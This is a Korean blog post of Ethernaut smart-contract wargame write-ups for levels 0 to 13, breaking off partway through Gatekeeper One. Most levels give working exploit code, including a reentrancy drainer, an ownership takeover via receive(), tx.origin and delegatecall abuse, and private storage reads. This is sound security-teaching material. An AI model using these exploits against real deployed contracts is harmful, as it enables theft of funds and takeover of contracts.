---
layout: post
title: "Ethernaut 0~40"
date: 2026-06-03
category: "CTF/Wargame"
tags: ["Ethereum", "Solidity", "Ethernaut", "Smart Contract", "Wargame"]
excerpt: "Ethernaut 문제 풀이 미완"
---

<div class="ethernaut-pager" data-ethernaut-pager>
  <div class="ethernaut-pager__top">
    <span class="ethernaut-pager__status" data-ethernaut-status>Ethernaut 0 / 40</span>
  </div>
  <div class="ethernaut-pager__tabs" data-ethernaut-tabs aria-label="Ethernaut level navigation"></div>

<section class="ethernaut-page" data-ethernaut-page data-level-title="Hello Ethernaut" markdown="1">

## 0. Hello Ethernaut

### 문제 요약

Ethernaut 사용법과 콘솔 상호작용을 익히는 튜토리얼.

### 핵심

- 브라우저 콘솔
- `contract` 인스턴스 호출
- `await` 기반 트랜잭션 확인

### 소스코드

```solidity
// 작성 예정
```

### 풀이

개발자 도구 콘솔에서 Ethernaut이 제공하는 전역 객체를 확인한다.

```javascript
await contract.info()
```

반환값이 다음에 호출할 함수를 알려준다. 힌트를 따라가면 된다.

```javascript
await contract.info1()
await contract.info2("hello")
await contract.infoNum()
await contract.info42()
await contract.theMethodName()
await contract.method7123949()
```

마지막으로 `password` 값을 읽고 `authenticate`에 넘긴다.

### 공격 코드

```javascript
const password = await contract.password();
await contract.authenticate(password);
```

![alt text](/assets/images/ethernaut/image.png)

### 정리

0번은 Ethernaut 콘솔 사용법을 익히는 문제다. `contract` 인스턴스는 현재 레벨 컨트랙트를 가리키며

 `await`로 view 함수와 트랜잭션 함수를 호출할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Fallback" markdown="1">

## 1. Fallback

### 문제 요약

이 레벨을 클리어하려면 다음 두 가지 조건을 모두 만족해야 한다.

- 해당 컨트랙트의 소유권 획득
- 컨트랙트의 잔액을 0으로 줄이기

### 핵심

- fallback / receive
- 소액 기여 조건
- 컨트랙트 소유권 변경

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### 풀이

핵심은 `receive()`다.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

`receive()`는 ETH를 직접 보낼 때 실행된다. 조건은 두 개다.

1. `msg.value > 0`
2. `contributions[msg.sender] > 0`

그래서 먼저 `contribute()`로 기여 기록을 만든다. 그 다음 컨트랙트에 ETH를 직접 보내면 `owner`가 내 주소로 바뀐다. 마지막으로 `withdraw()`를 호출해 잔액을 비운다.

### 공격 코드

```javascript
await contract.contribute({ value: 1 })

await sendTransaction({ to: contract.address, value: 1 })

await contract.withdraw()
```

- `contribute({ value: 1 })`: 1 wei를 보내 `contributions[player]` 값을 0보다 크게 만든다.
- `sendTransaction({ to: contract.address, value: 1 })`: 컨트랙트에 ETH를 직접 보내 `receive()`를 실행한다. 이때 `owner`가 내 주소로 바뀐다.
- `withdraw()`: `owner` 권한으로 컨트랙트 잔액을 출금한다.

### 정리

소액 기여 후 ETH를 직접 전송하면 `receive()`로 소유권을 탈취할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Fallout" markdown="1">

## 2. Fallout

### 문제 요약

컨트랙트의 소유권을 획득하면 클리어된다. 핵심은 생성자로 보여야 하는 함수가 실제로는 일반 public 함수라는 점이다.

### 핵심

- 생성자 오타
- 과거 Solidity 문법
- 접근 제어 실수

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

### 풀이

Solidity 0.4.22 이전에는 `constructor` 키워드가 아니라 컨트랙트 이름과 같은 함수가 생성자였다.

이 컨트랙트 이름은 `Fallout`인데 함수 이름은 `Fal1out`이다. 알파벳 `l`이 아니라 숫자 `1`이 들어가 있다.

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

그래서 이 함수는 배포 시 한 번만 실행되는 생성자가 아니다. 누구나 호출할 수 있는 public 함수다. 호출하면 `owner`가 `msg.sender`로 바뀐다.

### 공격 코드

```javascript
await contract.Fal1out()
await contract.owner()
```

- `Fal1out()`: 일반 public 함수라서 직접 호출 가능하다. 호출자의 주소가 `owner`가 된다.
- `owner()`: 소유권이 내 주소로 바뀌었는지 확인한다.

### 정리

생성자 이름을 잘못 쓰면 초기화 함수가 외부에 열린다. 과거 Solidity 코드에서는 컨트랙트 이름과 생성자 함수명이 정확히 일치하는지 확인해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Coin Flip" markdown="1">

## 3. Coin Flip

### 문제 요약

동전 던지기를 10번 연속 맞히면 클리어된다. 문제는 랜덤값이 실제 난수가 아니라 블록 정보로 계산된 예측 가능한 값이라는 점이다.

### 핵심

- 온체인 난수 취약점
- `blockhash`
- 예측 가능한 상태값

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

### 풀이

`flip()`은 이전 블록 해시를 숫자로 바꾼 뒤 `FACTOR`로 나눈다.

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

이 값은 같은 블록 안에서 누구나 똑같이 계산할 수 있다. 그래서 공격 컨트랙트에서 동일한 계산을 먼저 하고, 나온 값을 그대로 `flip()`에 넘기면 된다.

단, `lastHash` 검사 때문에 같은 블록에서 여러 번 호출할 수 없다.

```solidity
if (lastHash == blockValue) {
    revert();
}
```

따라서 공격 함수는 블록마다 한 번씩 총 10번 호출한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip private immutable target;

    constructor(address targetAddress) {
        target = ICoinFlip(targetAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;

        target.flip(guess);
    }
}
```

여기서 어떻게 하는지 몰라서 시간이 좀 걸렸다...

Remix IDE에 파일을 만들고 위 코드넣어서 compile 하고 지갑연결하고 어쩌고저쩌고

타겟주소 = 문제 인스턴스 주소

해서

Deploy

배포 후 `attack()`을 10개 블록에 걸쳐 10번 실행한다.

```javascript
await contract.consecutiveWins()
```

값이 `10`이면 인스턴스를 제출하면 된다.

### 정리

블록 해시, 타임스탬프 같은 온체인 값은 난수로 쓰면 안 된다. 모든 참여자가 같은 값을 읽고 같은 결과를 미리 계산할 수 있다.
</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Telephone" markdown="1">

## 4. Telephone

### 문제 요약

컨트랙트의 `owner`를 내 주소로 바꾸면 클리어된다. 직접 호출하면 실패하고, 중간 컨트랙트를 거쳐 호출해야 한다.

### 핵심

- `tx.origin`
- `msg.sender`
- 피싱형 호출 구조

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

### 풀이

취약한 부분은 `changeOwner()`의 조건문이다.

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

EOA가 직접 `changeOwner()`를 호출하면 다음처럼 된다.

- `tx.origin`: 내 지갑 주소
- `msg.sender`: 내 지갑 주소

둘이 같으므로 조건을 통과하지 못한다.

하지만 공격 컨트랙트를 거쳐 호출하면 값이 달라진다.

- `tx.origin`: 내 지갑 주소
- `msg.sender`: 공격 컨트랙트 주소

이제 `tx.origin != msg.sender`가 참이 되고, `owner`를 내가 원하는 주소로 바꿀 수 있다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone private immutable target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function attack(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
```

배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 공격 컨트랙트의 `attack()`에 내 지갑 주소를 넣고 실행한다.

```javascript
await contract.owner()
```

`owner`가 내 주소로 바뀌었으면 인스턴스를 제출하면 된다.

### 정리

권한 검증에 `tx.origin`을 쓰면 중간 컨트랙트 호출에 취약하다. 인증과 권한 확인은 보통 `msg.sender` 기준으로 해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Token" markdown="1">

## 5. Token

### 문제 요약

초기 토큰 20개를 가진 상태에서 내 잔액을 더 크게 만들면 클리어된다. `transfer()`의 뺄셈 검증이 잘못되어 언더플로우가 발생한다.

### 핵심

- 정수 언더플로우
- Solidity 0.8 이전 산술
- 잔액 검증

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

### 풀이

취약점은 `transfer()`의 검증식이다.

```solidity
require(balances[msg.sender] - _value >= 0);
```

`balances[msg.sender]`와 `_value`는 `uint256`이다. 음수가 될 수 없다.

Solidity 0.8 이전 버전에서는 산술 오버플로우와 언더플로우를 자동으로 막지 않는다. 내 잔액이 20인데 21을 전송하면 다음 계산이 먼저 일어난다.

```text
20 - 21
```

`uint256`에서는 음수 `-1`이 아니라 최댓값으로 감긴다.

```text
2^256 - 1
```

그래서 `require(... >= 0)`는 항상 통과한다. 이후 실제 차감에서도 언더플로우가 발생해 내 잔액이 매우 큰 값이 된다.

### 공격 코드

```javascript
await contract.balanceOf(player)

await contract.transfer("0x0000000000000000000000000000000000000001", 21)

await contract.balanceOf(player)
```

- `balanceOf(player)`: 현재 잔액 20을 확인한다.
- `transfer(..., 21)`: 가진 수량보다 1개 더 많이 전송해 언더플로우를 만든다.
- 다시 `balanceOf(player)`: 잔액이 `uint256` 최댓값 근처로 바뀐 것을 확인한다.

### 정리

Solidity 0.8 이전 코드에서는 산술 연산이 자동으로 안전하지 않다. 

`uint256` 뺄셈 전에 `balances[msg.sender] >= _value`처럼 명확히 검증하거나 `SafeMath`를 사용해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Delegation" markdown="1">

## 6. Delegation

### 문제 요약

컨트랙트의 `owner`를 내 주소로 바꾸면 클리어된다. 직접 `pwn()` 함수는 없지만, `fallback`에서 `delegatecall`을 사용한다.

### 핵심

- `delegatecall`
- 스토리지 컨텍스트
- 함수 selector

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

### 풀이

취약점은 `fallback()`이다.

```solidity
(bool result,) = address(delegate).delegatecall(msg.data);
```

`delegatecall`은 호출한 코드만 빌려오고, 상태 변경은 호출한 컨트랙트의 스토리지에 적용한다.

즉 `Delegate.pwn()` 코드가 실행되더라도 `owner = msg.sender`는 `Delegate`의 `owner`가 아니라 `Delegation`의 `owner`를 바꾼다.

문제는 `Delegation` 컨트랙트에 `pwn()` 함수가 없다는 점이다. 그래서 `pwn()`의 함수 selector를 calldata로 직접 보내 `fallback()`을 실행시킨다.

```javascript
web3.eth.abi.encodeFunctionSignature("pwn()")
```

`pwn()`의 selector는 `0xdd365b8b`다.

### 공격 코드

```javascript
const selector = web3.eth.abi.encodeFunctionSignature("pwn()");

await sendTransaction({
  from: player,
  to: contract.address,
  data: selector
});

await contract.owner();
```

- `data: selector`: 존재하지 않는 함수 호출처럼 보내서 `fallback()`을 실행한다.
- `fallback()`: `msg.data`를 그대로 `delegatecall`에 넘긴다.
- `Delegate.pwn()`: `Delegation`의 스토리지에서 `owner`를 `msg.sender`로 바꾼다.

### 정리

`delegatecall`은 대상 컨트랙트의 코드만 실행하고 스토리지는 현재 컨트랙트 것을 사용한다. 

검증 없이 `msg.data`를 넘기면 외부 코드가 내 컨트랙트 상태를 바꿀 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Force" markdown="1">

## 7. Force

### 문제 요약

비어 있는 컨트랙트에 ETH를 강제로 보내면 클리어된다. 대상 컨트랙트에는 `receive()`도 `fallback()`도 없지만, ETH 수신을 완전히 막을 수는 없다.

### 핵심

- `selfdestruct`
- 강제 ETH 전송
- `receive` 없는 컨트랙트

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

### 풀이

`Force` 컨트랙트는 아무 함수도 없다.

```solidity
contract Force {}
```

일반적인 ETH 전송은 실패한다. 받을 함수가 없기 때문이다.

하지만 `selfdestruct`는 다르다. 컨트랙트를 제거하면서 남은 ETH를 지정한 주소로 강제 전송한다. 이때 대상 주소가 ETH 수신 로직을 갖고 있는지 확인하지 않는다.

그래서 공격 컨트랙트에 ETH를 넣어 배포한 뒤, `selfdestruct` 대상으로 `Force` 인스턴스 주소를 넘기면 된다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function destroy(address payable target) external {
        selfdestruct(target);
    }
}
```

Remix에서 `ForceAttack`을 배포할 때 `Value`에 `1 wei` 이상을 넣는다.

배포 후 `destroy()`에 Ethernaut 인스턴스 주소를 넣고 실행한다.

```javascript
contract.address
```

잔액 확인:

```javascript
await getBalance(contract.address)
```

`0`보다 크면 인스턴스를 제출하면 된다.

### 정리

컨트랙트가 `receive()`나 `fallback()`을 구현하지 않아도 ETH를 받을 수 있다.

 `selfdestruct` 강제 전송, 채굴 보상, 미리 계산된 주소로 전송되는 ETH는 수신 함수 없이도 잔액을 만들 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Vault" markdown="1">

## 8. Vault

### 문제 요약

잠긴 Vault를 열면 클리어된다. `password`는 `private`이지만 온체인 스토리지에는 그대로 저장되어 있다.

### 핵심

- private 변수의 한계
- 스토리지 슬롯 조회
- 온체인 데이터 공개성

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

### 풀이

`private`은 다른 컨트랙트가 직접 접근하지 못하게 막는 Solidity 수준의 제한이다. 블록체인에 저장된 데이터 자체를 숨기지는 못한다.

스토리지 배치는 선언 순서대로 잡힌다.

- slot 0: `locked`
- slot 1: `password`

그래서 slot 1을 직접 읽으면 `password` 값을 얻을 수 있다.

```javascript
await web3.eth.getStorageAt(contract.address, 1)
```

얻은 값을 그대로 `unlock()`에 넘기면 된다.

### 공격 코드

```javascript
const password = await web3.eth.getStorageAt(contract.address, 1);

await contract.unlock(password);

await contract.locked();
```

- `getStorageAt(contract.address, 1)`: slot 1에 저장된 `password`를 읽는다.
- `unlock(password)`: 읽은 값을 그대로 넘겨 잠금을 해제한다.
- `locked()`: `false`가 나오면 성공이다.

### 정리

`private`은 비밀 저장소가 아니다. 온체인에 올라간 값은 누구나 스토리지 슬롯을 읽어 확인할 수 있다. 

비밀번호, 키, 시드 같은 민감한 값은 컨트랙트에 평문으로 저장하면 안 된다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="King" markdown="1">

## 9. King

### 문제 요약

내 컨트랙트를 왕으로 만든 뒤, 이후 다른 사용자가 왕이 되지 못하게 막으면 클리어된다. 

핵심은 이전 왕에게 ETH를 돌려주는 로직이 실패하면 전체 트랜잭션이 revert된다는 점이다.

### 핵심

- DoS
- ETH 수신 거부
- `transfer` 실패 처리

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

### 풀이

새 왕이 되려면 현재 `prize` 이상을 보내야 한다.

```solidity
require(msg.value >= prize || msg.sender == owner);
```

그 다음 기존 왕에게 새로 들어온 ETH를 돌려준다.

```solidity
payable(king).transfer(msg.value);
```

문제는 이 `transfer()`가 실패하면 전체 `receive()`가 revert된다는 점이다. 그래서 ETH를 받을 수 없는 공격 컨트랙트를 왕으로 만들면 된다.

공격 컨트랙트가 왕이 된 뒤 다른 사용자가 더 많은 ETH를 보내면, `King` 컨트랙트는 이전 왕인 공격 컨트랙트에 ETH를 보내려고 한다. 공격 컨트랙트의 `receive()`가 revert하므로 새 왕 교체도 실패한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable target) payable {
        (bool success,) = target.call{value: msg.value}("");
        require(success, "failed to become king");
    }

    receive() external payable {
        revert("no refund");
    }
}
```

Remix에서 `KingAttack`을 배포할 때 `target`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

`Value`에는 현재 `prize` 이상을 넣어야 한다.

```javascript
String(await contract.prize())
```

배포 후 왕이 공격 컨트랙트 주소로 바뀌었는지 확인한다.

```javascript
await contract._king()
```

이후 인스턴스를 제출하면 된다.

### 정리

외부 주소로 ETH를 보낼 때 실패 가능성을 고려하지 않으면 DoS가 생긴다. 

특히 `transfer()` 실패가 핵심 상태 변경을 막는 구조는 위험하다.

![alt text](/assets/images/ethernaut/image-1.png)

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Re-entrancy" markdown="1">

## 10. Re-entrancy

### 문제 요약

컨트랙트의 ETH 잔액을 0으로 만들면 클리어된다. 출금 함수가 잔액을 차감하기 전에 외부 호출을 먼저 해서 재진입이 가능하다.

### 핵심

- 재진입 공격
- Checks-Effects-Interactions
- 출금 로직 순서

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

### 풀이

취약점은 `withdraw()`의 순서다.

```solidity
(bool result,) = msg.sender.call{value: _amount}("");
balances[msg.sender] -= _amount;
```

컨트랙트가 ETH를 먼저 보내고, 그 다음에 잔액을 차감한다.

공격 컨트랙트가 ETH를 받으면 `receive()`가 실행된다. 이 안에서 다시 `withdraw()`를 호출하면 아직 `balances[msg.sender]`가 줄어들기 전이라 같은 금액을 또 출금할 수 있다.

흐름은 다음과 같다.

1. 공격 컨트랙트가 `donate()`로 잔액을 만든다.
2. `withdraw()`를 호출한다.
3. ETH를 받는 순간 공격 컨트랙트의 `receive()`가 실행된다.
4. 대상 컨트랙트 잔액이 남아 있으면 다시 `withdraw()`를 호출한다.
5. 반복해서 대상 컨트랙트 잔액을 비운다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance private immutable target;

    constructor(address targetAddress) {
        target = IReentrance(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "value required");

        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;

        if (targetBalance > 0) {
            uint256 withdrawAmount = targetBalance < msg.value
                ? targetBalance
                : msg.value;

            target.withdraw(withdrawAmount);
        }
    }
}
```

Remix에서 `ReentranceAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 `attack()`을 실행할 때 `Value`에 소액 ETH를 넣는다. 대상 잔액보다 크지 않은 값이면 된다.

대상 잔액 확인:

```javascript
await getBalance(contract.address)
```

공격 후 잔액이 `0`이면 인스턴스를 제출한다.

### 정리

외부 호출 전에 상태를 먼저 변경해야 한다. `withdraw()`는 잔액 차감 후 ETH 전송을 해야 하며

재진입 방지를 위해 Checks-Effects-Interactions 패턴이나 reentrancy guard를 사용해야 한다.

컨퍼런스 리뷰에서 나왔던 `reentrancy` 재진입 공격이다. 

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Elevator" markdown="1">

## 11. Elevator

### 문제 요약

엘리베이터를 최상층에 도달한 상태로 만들면 클리어된다. 

대상 컨트랙트는 호출자를 `Building` 인터페이스로 믿고 `isLastFloor()` 결과를 그대로 사용한다.

### 핵심

- 인터페이스 신뢰 문제
- 상태 변화 기반 응답
- 외부 컨트랙트 호출

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

### 풀이

`goTo()`는 `msg.sender`를 `Building`으로 캐스팅한다.

```solidity
Building building = Building(msg.sender);
```

즉 일반 지갑으로 직접 호출하는 것이 아니라, `isLastFloor()`를 구현한 공격 컨트랙트에서 호출해야 한다.

핵심은 `isLastFloor()`가 두 번 호출된다는 점이다.

```solidity
if (!building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
```

첫 번째 호출은 `false`를 반환해야 `if` 안으로 들어간다. 두 번째 호출은 `true`를 반환해야 `top`이 `true`가 된다.

그래서 공격 컨트랙트 내부 상태를 바꿔 호출마다 다른 값을 반환하게 만든다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator private immutable target;
    bool private called;

    constructor(address targetAddress) {
        target = IElevator(targetAddress);
    }

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }

        return true;
    }
}
```

Remix에서 `ElevatorAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 `attack()`을 실행하고 확인한다.

```javascript
await contract.top()
```

`true`가 나오면 인스턴스를 제출하면 된다.

### 정리

외부 컨트랙트의 반환값을 신뢰하면 안 된다. 같은 함수라도 호출 시점과 내부 상태에 따라 다른 값을 반환할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Privacy" markdown="1">

## 12. Privacy

### 문제 요약

`locked`를 `false`로 만들면 클리어된다. `private` 배열에 들어 있는 `data[2]`를 스토리지에서 읽고, 앞 16바이트만 잘라 키로 사용한다.

### 핵심

- 스토리지 레이아웃
- packing
- bytes 캐스팅

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

### 풀이

`unlock()`은 `bytes16(data[2])`와 입력값을 비교한다.

```solidity
require(_key == bytes16(data[2]));
```

`data`는 `private`이지만 스토리지에서 직접 읽을 수 있다. 먼저 슬롯 배치를 계산한다.

- slot 0: `locked`
- slot 1: `ID`
- slot 2: `flattening`, `denomination`, `awkwardness` packing
- slot 3: `data[0]`
- slot 4: `data[1]`
- slot 5: `data[2]`

따라서 slot 5를 읽으면 `data[2]`가 나온다.

```javascript
await web3.eth.getStorageAt(contract.address, 5)
```

`unlock()`은 `bytes16`을 받으므로 `bytes32` 전체가 아니라 앞 16바이트만 넘겨야 한다. 16바이트는 hex 문자 32개이고, 앞의 `0x`까지 포함하면 `slice(0, 34)`다.

### 공격 코드

```javascript
const data = await web3.eth.getStorageAt(contract.address, 5);
const key = data.slice(0, 34);

await contract.unlock(key);

await contract.locked();
```

- `getStorageAt(contract.address, 5)`: `data[2]`가 저장된 slot 5를 읽는다.
- `slice(0, 34)`: `0x`와 앞 16바이트만 남긴다.
- `unlock(key)`: 잘라낸 값을 키로 넘긴다.
- `locked()`: `false`가 나오면 성공이다.

### 정리

`private`은 데이터를 숨기지 않는다. 또한 Solidity 스토리지 레이아웃과 packing 규칙을 알면 private 배열 값도 직접 찾아 읽을 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper One" markdown="1">

## 13. Gatekeeper One

### 문제 요약

세 개의 gate를 통과해 `entrant`를 내 주소로 만들면 클리어된다. 직접 호출은 막혀 있고, gas 조건과 `bytes8` 조건을 맞춰야 한다.

### 핵심

- modifier 우회
- gas 조절
- bytes 변환 조건

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### 풀이

`gateOne`은 직접 호출을 막는다.

```solidity
require(msg.sender != tx.origin);
```

EOA가 공격 컨트랙트를 호출하고, 공격 컨트랙트가 `enter()`를 호출하면 조건이 통과된다.

- `tx.origin`: 내 지갑 주소
- `msg.sender`: 공격 컨트랙트 주소

`gateTwo`는 남은 gas가 `8191`로 나누어떨어져야 한다.

```solidity
require(gasleft() % 8191 == 0);
```

